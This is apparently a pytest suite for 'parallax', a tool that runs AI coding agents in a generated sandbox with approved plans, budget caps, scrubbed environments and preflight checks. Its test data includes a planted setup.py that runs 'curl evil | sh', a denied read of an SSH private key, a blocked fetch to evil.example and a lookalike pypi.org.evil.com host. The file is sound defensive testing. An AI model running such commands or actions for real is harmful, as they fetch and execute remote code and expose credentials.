import json
import shlex
import shutil
import stat
import subprocess
import sys
from pathlib import Path

import pytest

from fakes import FakeChecker, FakeDrafter, ScriptedAgent, good_probe
from sandboxcheck import why_not
from parallax import approvals, build, guard, lifecycle, preflight, sandbox
from parallax.agents.base import Finding, Review
from parallax.agents.claude import tool_to_action
from parallax.cli import main
from parallax.core import POLICY_FILE, ParallaxError, Project
from parallax.gate import Scope, host_allowed, make_permission_fn
from parallax.build import flag_stale_runs
from test_lifecycle_gates import WANT, docs, make_key

# not inside a sandbox already: a sandbox won't start nested in one (the M9 spike)
NO_SANDBOX = why_not()  # None when the real sandbox starts here


@pytest.fixture
def proj(repo):
    make_key()
    return Project.init(repo)


def approved_task(proj, plan_docs=None) -> str:
    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(plan_docs or docs()))["task"]
    lifecycle.approve(proj, tid)
    return tid


def kinds(proj, kind):
    return [e for e in proj.ledger.entries() if e["kind"] == kind]


# the two M8 bugs --------------------------------------------------------------------------------

def test_init_points_to_do(repo, monkeypatch, capsys):
    monkeypatch.chdir(repo)
    main(["init"])
    assert 'next: parallax do "what you want done"' in capsys.readouterr().out


def test_the_report_carries_the_drafted_files_not_looked_at(proj):
    short = docs()
    short["plan"] = short["plan"].replace("Not looked at: nothing", "Not looked at: the Windows side.")
    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(short))["task"]
    text = lifecycle.report(proj, tid)
    assert "Not looked at: plan.md says: the Windows side." in text
    assert lint_ok(proj, text)

    long = docs()
    gap = "whether the apt Node is new enough, whether the NodeSource script moved, and a fresh distro run"
    long["intent"] = long["intent"].replace("Not looked at: nothing", f"Not looked at: {gap}.")
    long["plan"] = long["plan"].replace("Not looked at: nothing", "Not looked at: anything under docs/tasks/.")
    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(long))["task"]
    text = lifecycle.report(proj, tid)
    assert "Not looked at: see Found (2)" in text
    assert f"- docs/tasks/{tid}/intent.md:2 not looked at: {gap}." in text
    assert f"- docs/tasks/{tid}/plan.md:2 not looked at: anything under docs/tasks/." in text
    assert lint_ok(proj, text)


def test_very_long_gaps_move_to_details_and_still_lint(proj):
    long = docs()
    gap = " ".join(["unchecked"] * 160)
    long["plan"] = long["plan"].replace("Not looked at: nothing", f"Not looked at: {gap}.")
    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(long))["task"]
    text = lifecycle.report(proj, tid)
    assert "see Details (1)" in text and "\nDetails\n" in text and gap in text
    assert lint_ok(proj, text)


def lint_ok(proj, text):
    from parallax import lint
    return lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []


# the generated sandbox ---------------------------------------------------------------------------

def test_the_rules_come_from_the_plan_and_live_outside_the_worktree(proj):
    plan = docs()["plan"].replace("domains = []", 'domains = ["pypi.org"]').replace(
        "outside_reads = []", 'outside_reads = ["/opt/data"]')
    tid = approved_task(proj, {**docs(), "plan": plan})
    p = build.prepare(proj, tid)
    wt = p.worktree
    git_dir = sandbox.shared_git_dir(wt)
    assert git_dir == (proj.root / ".git").resolve()

    s = json.loads(p.settings.read_text())["sandbox"]
    assert (s["enabled"], s["failIfUnavailable"], s["allowUnsandboxedCommands"], s["autoAllowBashIfSandboxed"]) \
        == (True, True, False, False)
    assert s["network"] == {"allowedDomains": ["pypi.org"], "strictAllowlist": True, "allowLocalBinding": False}
    fs = s["filesystem"]
    assert fs["allowWrite"] == [str(wt)]
    assert {str(wt / t) for t in sandbox.ROOT_TARGETS} | {str(git_dir)} <= set(fs["denyWrite"])
    assert fs["denyRead"][:2] == [str(Path.home()), "/mnt"] and str(approvals.key_path().parent) in fs["denyRead"]
    assert fs["allowRead"] == [str(wt), str(git_dir), "/opt/data", str(p.home / "memcap")]  # the cap for its commands
    assert json.loads((p.home / "srt.json").read_text())["filesystem"] == fs

    assert not p.settings.is_relative_to(wt) and not p.settings.is_relative_to(proj.root)
    assert stat.S_IMODE(p.home.stat().st_mode) == 0o700
    assert p.scope == Scope(reads=(Path("/opt/data"),), domains=("pypi.org",))


def test_nested_protected_paths_are_denied_and_runtime_mount_points_exist(proj):
    tid = approved_task(proj)
    wt = Path(proj.task(tid)["worktree"])
    (wt / "sub").mkdir()
    (wt / "sub" / "CLAUDE.md").write_text("x")
    (wt / ".claude").mkdir()
    targets = sandbox.protected_targets(wt)
    assert wt / "sub" / "CLAUDE.md" in targets and wt / ".claude" in targets
    build.prepare(proj, tid)
    assert (wt / ".claude" / "commands").is_dir() and (wt / ".claude" / "agents").is_dir()
    assert "commands" not in subprocess.run(["git", "-C", str(wt), "status", "--porcelain"],
                                            capture_output=True, text=True).stdout


def test_leftover_placeholders_are_removed_but_real_work_stays(proj):
    tid = approved_task(proj)
    wt = Path(proj.task(tid)["worktree"])
    (wt / "package.json").write_text('{"name": "mine"}')  # real content: kept
    before = sandbox.untracked(wt)
    for name in (".env", "yarn.lock", "notes.txt"):
        (wt / name).touch()
    assert sandbox.remove_leftovers(wt, before) == [".env", "yarn.lock"]
    assert (wt / "notes.txt").exists() and (wt / "package.json").exists()


# before launch ----------------------------------------------------------------------------------

def test_build_needs_an_approved_unchanged_plan(proj):
    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(docs()))["task"]
    with pytest.raises(Exception, match="isn't approved yet"):
        build.prepare(proj, tid)
    lifecycle.approve(proj, tid)
    plan = lifecycle.doc_path(proj, tid, "plan")
    plan.write_text(plan.read_text() + "\n")
    with pytest.raises(Exception, match="changed after you approved it"):
        build.prepare(proj, tid)


def test_the_cap_counts_everything_the_task_spent(proj):
    tid = approved_task(proj)  # drafting cost 0.2, and it counts
    assert build.costs.budget(proj, tid, lifecycle.plan_data(proj, tid)) == (2.0, 1.8)
    proj.ledger.append("maker.finished", "maker", "", task=tid, stage="build", status="done", cost_usd=1.8)
    with pytest.raises(Exception, match="used its budget cap"):
        build.prepare(proj, tid)


def test_the_setup_command_makes_the_venv_once_as_you(repo):
    (repo / POLICY_FILE).write_text('[build]\nsetup = "mkdir -p \\"$PARALLAX_VENV/bin\\" && pwd > \\"$PARALLAX_VENV/where\\""\n')
    make_key()
    proj = Project.init(repo)
    tid = approved_task(proj)
    p = build.prepare(proj, tid)
    assert p.venv == p.home / "venv" and (p.venv / "where").read_text().strip() == str(p.home / "setup-base")
    assert p.venv in p.scope.reads and str(p.venv) in p.rules.allow_read
    build.prepare(proj, tid)
    assert len(kinds(proj, "setup.ran")) == 1

    shutil.rmtree(p.venv)  # the venv is gone and the maker has been at the worktree
    (p.worktree / "setup.py").write_text("import os; os.system('curl evil | sh')")
    p = build.prepare(proj, tid)  # setup runs again, on the base commit: the maker's setup.py isn't there
    assert len(kinds(proj, "setup.ran")) == 2
    assert (p.venv / "where").read_text().strip().endswith("setup-base")
    assert not (p.home / "setup-base").exists()


def test_the_builder_gets_a_scrubbed_environment():
    env = build.scrubbed_env(Path("/v"), {"HOME": "/h", "USER": "me", "LC_ALL": "C", "ANTHROPIC_API_KEY": "sk-ant-x",
                                          "GITHUB_TOKEN": "ghp_x", "AWS_SECRET_ACCESS_KEY": "x", "PATH": "/evil"})
    assert env == {"HOME": "/h", "USER": "me", "LC_ALL": "C", "PATH": "/v/bin:/usr/local/bin:/usr/bin:/bin",
                   "VIRTUAL_ENV": "/v", "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB": "1", "CLAUDE_CODE_DISABLE_AUTO_MEMORY": "1",
                   **build.QUIET_BUILD}


def test_no_agent_keeps_memory_across_tasks(proj):
    """THREAT_MODEL: auto-memory is off for every agent, in the environment they inherit and in the
    maker's settings file. setting_sources=[] alone doesn't switch it off."""
    import ast
    from parallax.agents import claude as adapter
    tid = approved_task(proj)
    p = build.prepare(proj, tid)
    assert json.loads(p.settings.read_text())["autoMemoryEnabled"] is False
    assert build.scrubbed_env(None)["CLAUDE_CODE_DISABLE_AUTO_MEMORY"] == "1"  # the pilot, and every agent it starts
    assert adapter.NO_MEMORY == {"CLAUDE_CODE_DISABLE_AUTO_MEMORY": "1"}
    source = ast.parse(Path(adapter.__file__).read_text())
    calls = [n for n in ast.walk(source) if isinstance(n, ast.Call) and getattr(n.func, "attr", "") == "ClaudeAgentOptions"]
    assert len(calls) == 3  # maker and drafters, the UI tester, the checker
    for call in calls:  # each passes an env built from NO_MEMORY
        env = next(k.value for k in call.keywords if k.arg == "env")
        assert "NO_MEMORY" in ast.dump(env), ast.dump(env)


# the tool layer during a build ----------------------------------------------------------------------

def test_a_build_allows_routine_work_and_refuses_the_boundary(proj, tmp_path):
    tid = approved_task(proj)
    wt = Path(proj.task(tid)["worktree"])
    venv = tmp_path / "venv"
    fn = make_permission_fn(proj, tid, wt, scope=Scope(reads=(venv,), domains=("*.pypi.org",)))
    cases = [
        (("Write", {"file_path": "README.md", "content": "x"}), True),
        (("Bash", {"command": "python -m pytest -q"}), True),
        (("Read", {"file_path": str(venv / "lib" / "x.py")}), True),
        (("WebFetch", {"url": "https://files.pypi.org/x"}), True),
        (("Write", {"file_path": "CLAUDE.md", "content": "x"}), False),
        (("Edit", {"file_path": "docs/tasks/x/plan.md"}), False),
        (("Write", {"file_path": ".git", "content": "gitdir: /elsewhere"}), False),
        (("Read", {"file_path": str(Path.home() / ".ssh" / "id_ed25519")}), False),
        (("WebFetch", {"url": "https://evil.example/x"}), False),
        (("WebSearch", {"query": "x"}), False),
        (("Task", {"prompt": "spawn"}), False),
    ]
    for (tool, args), ok in cases:
        assert fn(*tool_to_action(tool, args)).allowed is ok, (tool, args)
    assert kinds(proj, "decision.requested") == []  # nothing waits on you


def test_host_matching():
    assert host_allowed("https://pypi.org/simple", ("pypi.org",))
    assert host_allowed("https://files.pypi.org/x", ("*.pypi.org",))
    assert not host_allowed("https://pypi.org.evil.com/", ("pypi.org",))
    assert not host_allowed("https://x.org/", ())


def test_shell_check_reads_tokens_not_substrings(tmp_path):
    assert guard.check_shell("cat .gitignore && git status", tmp_path) is None
    assert guard.check_shell("echo x > CLAUDE.md", tmp_path)
    assert guard.check_shell("dd if=a of=.claude/settings.json", tmp_path)
    assert guard.check_shell(f"touch {shlex.quote(str(tmp_path / 'docs' / 'tasks' / 'x'))}", tmp_path)  # a path may hold a space


# preflight -------------------------------------------------------------------------------------------

def test_preflight_passes_when_nothing_gets_through(proj):
    tid = approved_task(proj)
    p = build.prepare(proj, tid)
    lines = build.run_preflight(proj, p, runner=good_probe)
    assert all(line.ok for line in lines), lines
    out = preflight.report(lines)
    paths = len(sandbox.protected_targets(p.worktree)) + 1  # and the shared .git directory
    assert out[0].startswith(f"bash layer   0 of {paths} protected paths writable") and out[-1] == "ready to launch."
    assert out[1].startswith(f"tool layer   0 of {paths * 5 + 2} protected writes and reads allowed")
    assert [e["kind"] for e in proj.ledger.entries()][-1] == "preflight.recorded"  # its only trace


@pytest.mark.parametrize("probe,line", [
    (lambda *a: None, "bash layer"),
    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "written": spec["sentinels"][:1]}, "bash layer"),
    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "network": ["127.0.0.1:1"]}, "network"),
    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "env": ["GITHUB_TOKEN"]}, "environment"),
    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "readable": spec.get("reads", [])}, "environment"),
])
def test_preflight_refuses_anything_that_gets_through(proj, probe, line):
    tid = approved_task(proj)
    p = build.prepare(proj, tid)
    lines = {line.name: line for line in build.run_preflight(proj, p, runner=probe)}
    assert not lines[line].ok
    assert preflight.report(list(lines.values()))[-1] == "not ready: refusing to launch."


def test_a_sentinel_that_got_through_is_removed(proj):
    tid = approved_task(proj)
    p = build.prepare(proj, tid)

    def leaky(config, cwd, spec, env):
        for s in spec["sentinels"]:
            Path(s).write_text("x")
        return good_probe(config, cwd, spec, env)

    lines = build.run_preflight(proj, p, runner=leaky)
    assert not lines[0].ok and lines[0].detail.startswith("1 of ")
    assert not list((proj.root / ".git").glob(".parallax-preflight-*"))


@pytest.mark.skipif(NO_SANDBOX is not None, reason=NO_SANDBOX or "")
def test_preflight_against_the_real_sandbox(proj):
    tid = approved_task(proj)
    wt = Path(proj.task(tid)["worktree"])
    (wt / ".claude").mkdir()
    p = build.prepare(proj, tid)
    lines = build.run_preflight(proj, p)
    assert all(line.ok for line in lines), preflight.report(lines)
    assert subprocess.run(["git", "-C", str(wt), "status", "--porcelain"], capture_output=True, text=True).stdout == ""
    assert not list((proj.root / ".git").glob(".parallax-preflight-*"))

    import dataclasses
    weak = dataclasses.replace(p.rules, deny_write=[], allow_write=[str(wt), str(proj.root / ".git")])
    real, _, leaked = preflight.bash_layer(wt, sandbox.protected_targets(wt), sandbox.shared_git_dir(wt), weak,
                                           p.home, build.scrubbed_env(None), preflight.run_srt,
                                           {"reads": [], "value_marks": []})
    assert len(leaked) == 2 and not list((proj.root / ".git").glob(".parallax-preflight-*"))


@pytest.mark.skipif(NO_SANDBOX is not None, reason=NO_SANDBOX or "")
def test_a_real_preflight_where_user_namespaces_are_blocked(proj, tmp_path, monkeypatch):
    """The real srt and bwrap, inside a bwrap that forbids new user namespaces, as hand check M1 did by hand."""
    from parallax import sandboxfail, show
    from realout import line
    monkeypatch.setattr(sandboxfail, "on_wsl", lambda: False)
    blocked = tmp_path / "blocked"
    blocked.mkdir()
    (blocked / "srt").write_text("#!/bin/sh\nexec bwrap --dev-bind / / --unshare-user --disable-userns -- "
                                 f'{shlex.quote(shutil.which("srt"))} "$@"\n')
    (blocked / "srt").chmod(0o755)
    runner = lambda c, cwd, spec, env: preflight.run_srt(c, cwd, spec, {**env, "PATH": f"{blocked}:{env['PATH']}"})  # noqa: E731
    tid = approved_task(proj)
    assert build.run_build(proj, tid, lambda left, settings: pytest.fail("Maker started"), preflight_runner=runner) == "stuck"
    said = line("bwrap-0.9.0-disable-userns.stderr")
    assert proj.inbox()[-1]["data"]["sandbox"] == said
    card = show.report(proj, tid)
    assert said in card and "To fix it, allow user namespaces" in card and "parallax doctor" in card


# launch, run, stop -------------------------------------------------------------------------------------

def test_preflight_runs_in_one_place_for_every_way_an_agent_can_launch(proj, monkeypatch):
    """Every entry point ends in build.run_build, which preflights before the maker starts, and only there."""
    from parallax import decide, pilot, ui
    ran = []
    real = preflight.run

    def spy(project, task_id, *a, **kw):
        ran.append(task_id)
        return real(project, task_id, *a, **kw)
    monkeypatch.setattr(preflight, "run", spy)
    monkeypatch.setattr(preflight, "run_srt", good_probe)
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append(argv) or 4242)
    maker = lambda left, settings: ScriptedAgent(steps=[("write", "README.md", "ok\n")])  # noqa: E731

    # the launchers only spawn: none of them preflights on its own
    tid = approved_task(proj)
    monkeypatch.chdir(proj.root)
    assert main(["build", tid]) == 0                                                  # parallax build
    proj.ledger.append("task.stopped", "human", "", task=tid, pid=4242)
    proj.ledger.append("build.finished", "parallax", "", task=tid, status="built")
    assert main(["recheck", tid]) == 0                                                # parallax recheck
    proj.ledger.append("task.stopped", "human", "", task=tid, pid=4242)
    proj.ledger.append("stuck.raised", "parallax", "it stopped", task=tid)
    assert decide.apply(proj, tid, "retry").startswith("checking")                     # parallax decide / the UI's decide
    proj.ledger.append("task.stopped", "human", "", task=tid, pid=4242)
    t2 = pilot.intake(proj, "again")["task"]                                          # parallax do / the UI's intake box
    assert ui.act(proj, "/api/do", {"work": "and again"})["task"]                     # the UI route itself
    assert ran == [] and [a[-1] for a in spawned] == ["build", "check", "check", "pilot", "pilot"]
    assert all(a[-5:-3] == ["-m", "parallax.build"] for a in spawned)               # one background module for all

    # the background module, in each of its modes, preflights before any maker run
    fakes = dict(drafter_for=FakeDrafter(docs()), maker_for=maker, checker_for=FakeChecker())
    from fakes import junit_runner
    assert build.run_mode(proj, tid, "build", fakes["drafter_for"], maker, fakes["checker_for"],
                          test_runner=junit_runner(), preflight_runner=good_probe) == "ready"
    assert ran == [tid]
    assert build.run_mode(proj, t2, "pilot", fakes["drafter_for"], maker, fakes["checker_for"],
                          test_runner=junit_runner(), preflight_runner=good_probe) == "ready"
    assert ran == [tid, t2]
    entries = proj.ledger.entries()
    for task in (tid, t2):  # and it comes before the maker, every time
        mine = [e["kind"] for e in entries if e["data"].get("task") == task]
        assert mine.index("preflight.recorded") < mine.index("maker.started")
    # a rework is a maker run too
    proj.ledger.append("task.redraft", "human", "again", task=tid)
    checker = FakeChecker(reviews=[Review("fail", [Finding("blocker", "README.md:1", "wrong", cites=["outcome 1"])], "nothing"), Review("pass")])
    assert build.run_mode(proj, tid, "pilot", fakes["drafter_for"], maker, checker,
                          test_runner=junit_runner(), preflight_runner=good_probe) == "ready"
    assert ran == [tid, t2, tid, tid]
    # and by hand, the same module: a failing preflight means no maker, and it comes to you
    proj.ledger.append("task.redraft", "human", "once more", task=tid)
    assert build.run_mode(proj, tid, "pilot", fakes["drafter_for"], maker, FakeChecker(),
                          test_runner=junit_runner(), preflight_runner=lambda *a: None) == "stuck"
    assert proj.inbox()[-1]["reason"].startswith("preflight failed (bash layer: the sandbox didn't run the probe") \
        and proj.inbox()[-1]["reason"].endswith("so the build didn't launch") and proj.inbox()[-1]["data"]["preflight"] == ["bash layer", "network", "environment"]


def test_cli_build_launches_the_builder_in_the_background(proj, monkeypatch, capsys):
    tid = approved_task(proj)
    monkeypatch.chdir(proj.root)
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append((argv, env)) or 4242)
    assert main(["build", tid]) == 0
    assert capsys.readouterr().out == f"building {tid}, estimated budget $1.80. parallax stop ends it.\n"  # drafting cost 0.2
    [(argv, env)] = spawned
    assert argv[-4:] == ["parallax.build", str(proj.root), tid, "build"]
    assert env["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] == "1" and "ANTHROPIC_API_KEY" not in env
    [s] = kinds(proj, "build.started")
    assert s["data"]["pid"] == 4242 and proj.task(tid)["status"] == "running"
    assert main(["build", tid]) == 1  # one build at a time
    assert "already building" in capsys.readouterr().err


def test_the_builder_runs_the_maker_and_records_the_outcome(proj):
    tid = approved_task(proj)
    got = {}

    def maker_for(left, settings):
        got.update(left=left, settings=settings)
        return ScriptedAgent(steps=[("write", "README.md", "new\n"), ("call", lambda cwd: (cwd / ".env").touch())],
                             summary="rewrote the README", cost=0.3)

    assert build.run_build(proj, tid, maker_for, preflight_runner=good_probe) == "built"
    assert got["left"] == 1.8 and got["settings"].endswith("settings.json")
    assert kinds(proj, "sandbox.cleaned")[0]["data"]["files"] == [".env"]
    assert lifecycle.status_line(proj, tid) == "built"
    assert "README.md" in proj.diff(tid, "--name-only")


@pytest.mark.parametrize("steps,summary,status", [
    ([("call", lambda cwd: (cwd / "sub").mkdir() or (cwd / "sub" / "CLAUDE.md").write_text("x"))], "done", "disputed"),
    ([], "blocked: needs network to pypi.org", "blocked"),
])
def test_the_builder_reports_what_went_wrong(proj, steps, summary, status):
    tid = approved_task(proj)
    agent = ScriptedAgent(steps=steps, summary=summary, status="gave_up" if summary.startswith("blocked") else "done")
    assert build.run_build(proj, tid, lambda left, settings: agent, preflight_runner=good_probe) == status
    [item] = proj.inbox()  # either way, it's waiting on you now
    assert item["kind"] == ("disagreement.raised" if status == "disputed" else "stuck.raised")


def test_stop_ends_every_running_build_and_records_it(proj, capsys, monkeypatch):
    tid = approved_task(proj)
    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"], start_new_session=True)
    proj.ledger.append("build.started", "parallax", "", task=tid, pid=proc.pid)
    monkeypatch.chdir(proj.root)
    assert main(["stop"]) == 0
    assert capsys.readouterr().out == f"stopped {tid}.\n"
    assert proc.wait(timeout=10) is not None
    assert proj.task(tid)["status"] == "stopped"
    main(["stop"])
    assert capsys.readouterr().out == "nothing is running.\n"


def dead_pid():
    proc = subprocess.Popen([sys.executable, "-c", "pass"])
    proc.wait()
    return proc.pid


def test_a_builder_that_died_with_no_progress_is_started_again_once(proj, monkeypatch):
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append(argv) or 4242)
    tid = approved_task(proj)
    proj.ledger.append("build.started", "parallax", "", task=tid, pid=dead_pid(), mode="build")
    proj.ledger.append("maker.started", "parallax", "", task=tid, stage="build")
    assert flag_stale_runs(proj) == []  # not flagged: retried, recorded
    [retry] = kinds(proj, "task.retried")
    assert retry["actor"] == "parallax" and "started again once" in retry["reason"]
    assert kinds(proj, "build.died") and spawned[-1][-1] == "build" and proj.task(tid)["status"] == "running"
    assert not proj.inbox()

    proj.ledger.append("build.started", "parallax", "", task=tid, pid=dead_pid(), mode="build")  # dies again
    proj.ledger.append("maker.started", "parallax", "", task=tid, stage="build")
    assert flag_stale_runs(proj) == [tid]  # the second time comes to you
    assert proj.task(tid)["status"] == "stuck" and len(kinds(proj, "task.retried")) == 1


def test_a_builder_that_died_leaving_work_is_flagged_right_away(proj):
    tid = approved_task(proj)
    (Path(proj.task(tid)["worktree"]) / "README.md").write_text("half done\n")
    proj.ledger.append("build.started", "parallax", "", task=tid, pid=dead_pid(), mode="build")
    proj.ledger.append("maker.started", "parallax", "", task=tid, stage="build")
    assert flag_stale_runs(proj) == [tid]
    assert proj.task(tid)["status"] == "stuck" and not kinds(proj, "task.retried")


@pytest.mark.parametrize("folder", [lambda: str(approvals.key_path().parent), lambda: "~/.claude"])
def test_no_plan_can_read_the_approval_key_or_your_login(proj, folder):
    plan = docs()["plan"].replace("outside_reads = []", f'outside_reads = ["{folder()}/x"]')
    tid = approved_task(proj, {**docs(), "plan": plan})
    with pytest.raises(ParallaxError, match="approval key or Claude login"):
        build.prepare(proj, tid)
    assert sandbox.refused_reads(["/opt/data"]) == []


def test_the_sandbox_tools_are_found_wherever_node_put_them(tmp_path, monkeypatch):
    """srt from nvm, npm's global folder or a CI tool cache isn't on the system path; the scrubbed runs
    must still find it, and node with it, because srt is a node script."""
    from parallax import doctor, testrun
    bin_dir = tmp_path / "nvm" / "versions" / "node" / "v22" / "bin"
    bin_dir.mkdir(parents=True)
    for name in ("srt", "node"):
        (bin_dir / name).write_text("#!/bin/sh\necho fake-$0 \"$@\"\n")
        (bin_dir / name).chmod(0o755)
    system = tmp_path / "system"  # a system path with no srt of its own, whatever this machine has
    system.mkdir()
    for name in ("sh", "echo"):
        (system / name).symlink_to(f"/bin/{name}")
    monkeypatch.setenv("PATH", f"{bin_dir}:{system}")
    monkeypatch.setattr(build, "SYSTEM_PATH", str(system))
    assert sandbox.tool_paths()["srt"] == str(bin_dir / "srt")
    env = build.scrubbed_env(None)
    assert env["PATH"].split(":") == [str(system), str(bin_dir)]  # the system folders first, then where the tools were
    assert shutil.which("srt", path=env["PATH"]) == str(bin_dir / "srt")
    code, out = testrun._srt(tmp_path / "cfg.json", tmp_path, "true", env)  # runs the fake, so it was found
    assert code == 0 and "fake-" in out and "srt" in out
    with_venv = build.scrubbed_env(Path("/v"))
    assert with_venv["PATH"] == f"/v/bin:{system}:{bin_dir}"
    (system / "srt").symlink_to(bin_dir / "srt")  # nothing to add when the tools are on the system path already
    (system / "node").symlink_to(bin_dir / "node")
    assert build.scrubbed_env(None, {"PATH": str(system)})["PATH"] == str(system)
    # doctor says where it found srt when that's outside the system folders. Your home is elsewhere here,
    # so the path isn't shortened to ~ when this machine's temp folder sits under it
    monkeypatch.setenv("HOME", str(tmp_path / "someone"))
    m = doctor.Machine(which=lambda b: str(bin_dir / b) if b in ("bwrap", "socat", "srt") else None)
    assert doctor.check_sandbox(m).detail == f"bubblewrap, socat, srt (srt at {bin_dir / 'srt'})"
    m = doctor.Machine(which=lambda b: f"/usr/bin/{b}")
    assert doctor.check_sandbox(m).detail == "bubblewrap, socat, srt"
